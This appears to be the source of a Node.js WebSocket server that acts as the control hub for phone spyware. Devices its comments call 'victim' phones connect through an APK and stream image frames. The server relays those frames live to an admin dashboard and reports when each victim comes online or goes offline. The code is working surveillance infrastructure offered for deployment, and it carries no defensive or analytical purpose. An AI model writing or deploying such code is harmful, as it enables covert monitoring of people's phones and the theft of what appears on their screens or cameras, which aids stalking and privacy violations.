const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const compression = require('compression');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(compression());
app.use(express.static('public'));
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const streams = new Map(); // victimId -> ws
const viewers = new Set();

wss.on('connection', (ws, req) => {
    const url = req.url || '';
    const victimId = url.split('victim/')[1] || 'viewer';
    
    if (victimId !== 'viewer') {
        // Victim phone
        streams.set(victimId, ws);
        ws.victimId = victimId;
        console.log(`📱 Victim ${victimId.slice(0,8)} connected`);
        
        // Notify all viewers
        viewers.forEach(viewer => {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'victim_online',
                    victimId: victimId.slice(0,8)
                }));
            }
        });
    } else {
        // Admin dashboard
        viewers.add(ws);
        ws.send(JSON.stringify({
            type: 'init',
            victims: Array.from(streams.keys()).map(id => id.slice(0,8))
        }));
        console.log('👁️ Dashboard connected');
    }
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data.toString());
            
            if (msg.type === 'frame' && msg.victimId) {
                // Broadcast frame to viewers
                const frameData = {
                    type: 'frame',
                    victimId: msg.victimId.slice(0,8),
                    data: msg.data,
                    width: msg.width,
                    height: msg.height,
                    timestamp: msg.timestamp
                };
                
                viewers.forEach(viewer => {
                    if (viewer.readyState === WebSocket.OPEN) {
                        viewer.send(JSON.stringify(frameData));
                    }
                });
            }
        } catch(e) {
            console.error('Message error:', e);
        }
    });
    
    ws.on('close', () => {
        if (streams.has(ws.victimId)) {
            streams.delete(ws.victimId);
            viewers.forEach(v => {
                if (v.readyState === WebSocket.OPEN) {
                    v.send(JSON.stringify({
                        type: 'victim_offline',
                        victimId: ws.victimId.slice(0,8)
                    }));
                }
            });
        } else {
            viewers.delete(ws);
        }
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/status', (req, res) => {
    res.json({
        victims: Array.from(streams.keys()).map(id => id.slice(0,8)),
        viewers: viewers.size,
        uptime: process.uptime()
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Dashboard LIVE: https://your-app.onrender.com`);
    console.log(`📱 APK WebSocket: wss://your-app.onrender.com/victim/YOUR_ID`);
});
